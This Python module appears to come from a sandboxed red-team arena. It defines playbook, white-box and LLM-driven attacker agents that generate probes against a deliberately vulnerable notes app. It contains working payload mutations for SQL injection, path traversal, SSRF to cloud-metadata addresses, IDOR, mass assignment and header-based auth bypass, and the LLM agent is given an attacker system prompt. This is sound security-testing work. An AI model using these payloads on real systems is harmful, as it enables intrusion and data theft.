"""Attacker agents: an offline playbook and an LLM-driven planner.

Every attacker returns its batch through `finalize`, which enforces the
sandbox boundary, the route list, the attack history and the budget.
"""

from __future__ import annotations

import json
import urllib.parse
from collections.abc import Iterable
from dataclasses import dataclass, field, replace
from typing import Any, Protocol

from redteam.llm.base import LLMBackend, LLMError
from redteam.models import Probe
from redteam.sandbox import ProbeRejected, validate_probe
from redteam.scout import scout_target
from redteam.targets import NOTES, Target, default_target


@dataclass
class AttackHistory:
    """Everything the attacker has sent so far, split by outcome."""

    landed: list[Probe] = field(default_factory=list)
    blocked: list[Probe] = field(default_factory=list)
    sent: set[str] = field(default_factory=set)

    def record(self, probe: Probe, landed: bool) -> None:
        """Remember one sent probe and whether it produced a finding."""
        self.sent.add(probe.signature())
        (self.landed if landed else self.blocked).append(probe)

    def was_sent(self, probe: Probe) -> bool:
        """Return True if an identical probe was already sent."""
        return probe.signature() in self.sent


class Attacker(Protocol):
    """Plans one batch of probes for the next round."""

    name: str

    def plan(self, routes: list[str], history: AttackHistory, budget: int) -> list[Probe]:
        """Return at most `budget` new, valid probes aimed at known routes."""
        ...


def finalize(
    probes: Iterable[Probe],
    routes: list[str],
    history: AttackHistory,
    budget: int,
    *,
    replay: bool = False,
) -> list[Probe]:
    """Keep only valid, unique probes on known routes, up to `budget`.

    Probes already sent are dropped unless `replay` is set, which re-sends them on purpose.
    """
    known = set(routes)
    seen: set[str] = set()
    kept: list[Probe] = []
    for probe in probes:
        if len(kept) >= budget:
            break
        if probe.endpoint not in known:
            continue
        try:
            validate_probe(probe)
        except ProbeRejected:
            continue
        if not replay and history.was_sent(probe):
            continue
        signature = probe.signature()
        if signature in seen:
            continue
        seen.add(signature)
        kept.append(probe)
    return kept


# --- Playbook (offline, deterministic) -------------------------------------

_SQLI_OPERATORS: tuple[tuple[str, Any], ...] = (
    ("lowercase OR", lambda p: p.replace("OR", "or")),
    ("mixed-case OR", lambda p: p.replace("OR", "Or")),
    ("quoted tautology", lambda _p: "' or '1'='1' --"),
    ("percent-quote tautology", lambda _p: "%' or 1=1 --"),
    ("comment as C-style", lambda p: p.replace("--", "/*")),
    ("space as inline comment", lambda p: p.replace(" ", "/**/")),
)

_TRAVERSAL_OPERATORS: tuple[tuple[str, Any], ...] = (
    ("doubled dot-dot-slash", lambda p: p.replace("../", "....//")),
    ("dot-slash mix", lambda p: p.replace("../", "..././")),
    ("leading dot-slash", lambda p: "./" + p),
    ("encoded slash", lambda p: p.replace("../", "..%2f")),
    ("encoded dots", lambda p: p.replace("../", "%2e%2e/")),
)

_CRASH_VALUES: tuple[str, ...] = (
    "-0",
    "00",
    "",
    " ",
    "999999999999999999999",
    "1e3",
    "0x10",
    "-5",
    "None",
)


def _param_mutations(probe: Probe, key: str, candidates: Iterable[tuple[str, str]]) -> list[Probe]:
    """Build one probe per candidate value that differs from the original."""
    original = probe.params.get(key)
    if original is None:
        return []
    mutations: list[Probe] = []
    for operator, value in candidates:
        if value == original:
            continue
        mutations.append(
            replace(
                probe,
                params={**probe.params, key: value},
                note=f"mutation of {original!r}: {operator}",
            )
        )
    return mutations


def _mutate_idor(probe: Probe) -> list[Probe]:
    """Try neighbouring and zero-padded note ids."""
    prefix, _, id_text = probe.path.rpartition("/")
    if not id_text.isdigit():
        return []
    number = int(id_text)
    candidates = [(f"id {number}->{number + step}", str(number + step)) for step in range(1, 6)]
    candidates.append(("zero-padded id", "0" + str(number)))
    return [
        replace(
            probe,
            path=f"{prefix}/{value}",
            note=f"mutation of {probe.path!r}: {operator}",
        )
        for operator, value in candidates
    ]


def _mutate_mass_assignment(probe: Probe) -> list[Probe]:
    """Respell each body key (Role, ROLE, leading and trailing space) and keep its value."""
    if not probe.json_body:
        return []
    mutations: list[Probe] = []
    for key in probe.json_body:
        spellings = [
            ("capitalised key", key.capitalize()),
            ("upper-case key", key.upper()),
            ("leading space", " " + key),
            ("trailing space", key + " "),
        ]
        for operator, spelling in spellings:
            if spelling == key:
                continue
            body = {
                (spelling if name == key else name): value
                for name, value in probe.json_body.items()
            }
            mutations.append(
                replace(
                    probe,
                    json_body=body,
                    note=f"mutation of {key!r}: {operator}",
                )
            )
    return mutations


def _with_host(url: str, host: str) -> str:
    """Return `url` with its host replaced, keeping the scheme, path and query."""
    return urllib.parse.urlunsplit(urllib.parse.urlsplit(url)._replace(netloc=host))


def _mutate_ssrf(probe: Probe) -> list[Probe]:
    """Respell or replace the host of the import URL: case, dot, IP forms and localhost."""
    original = probe.params.get("url")
    if original is None:
        return []
    host = urllib.parse.urlsplit(original).hostname
    if not host:
        return []
    candidates = [
        ("upper-case host", host.upper()),
        ("trailing dot", host + "."),
        ("raw IP", "169.254.169.254"),
        ("decimal IP", "2852039166"),
        ("localhost", "localhost"),
    ]
    return _param_mutations(
        probe,
        "url",
        [(operator, _with_host(original, value)) for operator, value in candidates],
    )


def _mutate_auth_bypass(probe: Probe) -> list[Probe]:
    """Respell each header value: capitalised, upper-case and with a leading space."""
    mutations: list[Probe] = []
    for name, value in probe.headers.items():
        candidates = [
            ("capitalised value", value.capitalize()),
            ("upper-case value", value.upper()),
            ("leading space", " " + value),
        ]
        for operator, spelling in candidates:
            if spelling == value:
                continue
            mutations.append(
                replace(
                    probe,
                    headers={**probe.headers, name: spelling},
                    note=f"mutation of {value!r}: {operator}",
                )
            )
    return mutations


def mutate(probe: Probe) -> list[Probe]:
    """Return deterministic variants of a probe that keep its endpoint and class."""
    if probe.vuln_class == "sqli":
        original = probe.params.get("q")
        if original is None:
            return []
        return _param_mutations(
            probe,
            "q",
            [(name, transform(original)) for name, transform in _SQLI_OPERATORS],
        )
    if probe.vuln_class == "path_traversal":
        original = probe.params.get("name")
        if original is None:
            return []
        return _param_mutations(
            probe,
            "name",
            [(name, transform(original)) for name, transform in _TRAVERSAL_OPERATORS],
        )
    if probe.vuln_class == "idor":
        return _mutate_idor(probe)
    if probe.vuln_class == "crash":
        return _param_mutations(
            probe,
            "limit",
            [(f"limit={value!r}", value) for value in _CRASH_VALUES],
        )
    if probe.vuln_class == "mass_assignment":
        return _mutate_mass_assignment(probe)
    if probe.vuln_class == "ssrf":
        return _mutate_ssrf(probe)
    if probe.vuln_class == "auth_bypass":
        return _mutate_auth_bypass(probe)
    return []


def _seed_probes() -> list[Probe]:
    """The notes target's first-round hypotheses. Kept for existing callers."""
    return list(NOTES.seed_probes)


class PlaybookAttacker:
    """Replays the target's seed playbook, then mutates whatever landed or was blocked.

    With `adaptive=False` it is a one-shot scanner: it sends the seeds in round one and
    re-sends exactly the same seeds in every later round, with no mutations.
    """

    name: str

    def __init__(self, target: Target | None = None, *, adaptive: bool = True) -> None:
        self.target = target if target is not None else default_target()
        self.adaptive = adaptive
        self.name = "playbook" if adaptive else "one-shot"

    def plan(self, routes: list[str], history: AttackHistory, budget: int) -> list[Probe]:
        """Return the seed probes first, then mutations of known exploits."""
        if not self.adaptive:
            return finalize(self.target.seed_probes, routes, history, budget, replay=True)
        if not history.sent:
            batch = list(self.target.seed_probes)
        else:
            batch = []
            for probe in history.landed:
                batch.extend(mutate(probe))
            for probe in history.blocked:
                if probe.note.startswith("mutation of"):
                    batch.extend(mutate(probe))
        return finalize(batch, routes, history, budget)


class ScoutAttacker:
    """White-box: re-reads the current source each round and attacks the scout's leads.

    It never reads the target's hand-written seed, audit or fix data: every probe comes from
    the source the arena last showed it.
    """

    name = "white-box"

    def __init__(self, target: Target | None = None) -> None:
        self.target = target if target is not None else default_target()
        self._source: str | None = None

    def observe_source(self, source: str) -> None:
        """Remember the source the sandbox is running, before the next plan."""
        self._source = source

    def plan(self, routes: list[str], history: AttackHistory, budget: int) -> list[Probe]:
        """Return the scout's probes, then mutations of what landed or was blocked by the scout."""
        source = self._source if self._source is not None else self.target.load_source()
        try:
            leads = scout_target(self.target, source)
        except SyntaxError:
            leads = []
        batch = [probe for lead in leads for probe in lead.probes]
        for probe in history.landed:
            batch.extend(mutate(probe))
        for probe in history.blocked:
            if probe.note.startswith(("scout:", "mutation of")):
                batch.extend(mutate(probe))
        return finalize(batch, routes, history, budget)


# --- LLM planner ------------------------------------------------------------

SYSTEM_PROMPT = (
    "You are a security tester attacking a deliberately vulnerable sample app "
    "inside a local test sandbox. You must only output request specs in the "
    "required JSON schema. Adapt to fixes: when a payload was blocked, try "
    "variants of that payload rather than repeating it."
)

# Headers the model may never set: the sandbox sends the token itself and rejects a Host.
_RESERVED_HEADERS = frozenset({"host", "x-token"})


def plan_schema(target: Target) -> dict[str, Any]:
    """Return the JSON schema of one attack plan, with classes limited to the target's."""
    pair_list: dict[str, Any] = {
        "type": "array",
        "items": {
            "type": "object",
            "additionalProperties": False,
            "required": ["name", "value"],
            "properties": {
                "name": {"type": "string"},
                "value": {"type": "string"},
            },
        },
    }
    return {
        "type": "object",
        "additionalProperties": False,
        "required": ["probes"],
        "properties": {
            "probes": {
                "type": "array",
                "items": {
                    "type": "object",
                    "additionalProperties": False,
                    "required": [
                        "method",
                        "path",
                        "endpoint",
                        "vuln_class",
                        "params",
                        "headers",
                        "json_body",
                        "note",
                    ],
                    "properties": {
                        "method": {"type": "string"},
                        "path": {"type": "string"},
                        "endpoint": {"type": "string"},
                        "vuln_class": {"type": "string", "enum": list(target.vuln_classes)},
                        "params": pair_list,
                        "headers": pair_list,
                        # A JSON object written as text, or "" for no body: strict schemas
                        # cannot express an open object.
                        "json_body": {"type": "string"},
                        "note": {"type": "string"},
                    },
                },
            }
        },
    }


PLAN_SCHEMA: dict[str, Any] = plan_schema(NOTES)


def _compact(probe: Probe) -> dict[str, Any]:
    entry: dict[str, Any] = {
        "method": probe.method,
        "path": probe.path,
        "params": probe.params,
        "vuln_class": probe.vuln_class,
    }
    if probe.headers:
        entry["headers"] = probe.headers
    if probe.json_body is not None:
        entry["json_body"] = probe.json_body
    return entry


def _build_prompt(routes: list[str], history: AttackHistory, budget: int, target: Target) -> str:
    landed = [_compact(p) for p in history.landed[-20:]]
    blocked = [_compact(p) for p in history.blocked[-20:]]
    lines = [
        f"Target: {target.name}, {target.description}.",
        "",
        "Routes (METHOD /path-template):",
        *(f"- {route}" for route in routes),
        "",
        'Your own token is already sent as the X-Token header for user "mallory". '
        "A probe may add headers and a JSON body, but never a Host or X-Token header.",
        "A JSON body is a JSON object written as a string, or an empty string for none.",
        "Goal: make the app leak the secret canary (data mallory must not see), or return a 5xx.",
        f"Vulnerability classes: {', '.join(target.vuln_classes)}.",
        "Probes that landed (produced a finding), oldest first:",
        json.dumps(landed, separators=(",", ":"), sort_keys=True),
        "Probes that were blocked (sent, no finding), oldest first:",
        json.dumps(blocked, separators=(",", ":"), sort_keys=True),
        f"Return at most {budget} probes, each on one of the routes above.",
    ]
    return "\n".join(lines)


def _pairs(raw: Any) -> dict[str, str] | None:
    """Turn a list of {name, value} objects into a dict, or None if it is malformed."""
    if not isinstance(raw, list):
        return None
    pairs: dict[str, str] = {}
    for pair in raw:
        if not isinstance(pair, dict):
            return None
        name, value = pair.get("name"), pair.get("value")
        if not isinstance(name, str) or not isinstance(value, str):
            return None
        pairs[name] = value
    return pairs


def _probe_from_spec(item: Any, target: Target) -> Probe | None:
    """Turn one model-written item into a Probe, or None if it is malformed or off-target."""
    if not isinstance(item, dict):
        return None
    text_keys = ("method", "path", "endpoint", "vuln_class", "note")
    if not all(isinstance(item.get(key), str) for key in text_keys):
        return None
    if item["vuln_class"] not in target.vuln_classes:
        return None
    params = _pairs(item.get("params"))
    if params is None:
        return None
    # Missing headers or body are tolerated as "none", so older responses still parse.
    headers = _pairs(item.get("headers") or [])
    if headers is None:
        return None
    headers = {k: v for k, v in headers.items() if k.lower() not in _RESERVED_HEADERS}
    raw_body = item.get("json_body") or ""
    if not isinstance(raw_body, str):
        return None
    json_body: dict[str, Any] | None = None
    if raw_body.strip():
        try:
            parsed = json.loads(raw_body)
        except ValueError:
            return None
        if not isinstance(parsed, dict):
            return None
        json_body = parsed
    return Probe(
        method=item["method"].upper(),
        path=item["path"],
        endpoint=item["endpoint"],
        vuln_class=item["vuln_class"],
        params=params,
        headers=headers,
        json_body=json_body,
        note=item["note"],
    )


class LLMAttacker:
    """Asks an LLM for a batch of probes; falls back when the model fails."""

    name = "llm"

    def __init__(
        self,
        backend: LLMBackend,
        *,
        fallback: Attacker | None = None,
        target: Target | None = None,
    ) -> None:
        self.backend = backend
        self.fallback = fallback
        self.target = target if target is not None else default_target()
        self._schema = plan_schema(self.target)

    def plan(self, routes: list[str], history: AttackHistory, budget: int) -> list[Probe]:
        """Return validated probes from the model, or the fallback's probes on failure."""
        prompt = _build_prompt(routes, history, budget, self.target)
        try:
            response = self.backend.complete_json(
                system=SYSTEM_PROMPT, prompt=prompt, schema=self._schema
            )
        except LLMError:
            if self.fallback is not None:
                return self.fallback.plan(routes, history, budget)
            return []
        raw = response.get("probes") if isinstance(response, dict) else None
        if not isinstance(raw, list):
            return []
        probes = [
            probe for item in raw if (probe := _probe_from_spec(item, self.target)) is not None
        ]
        return finalize(probes, routes, history, budget)
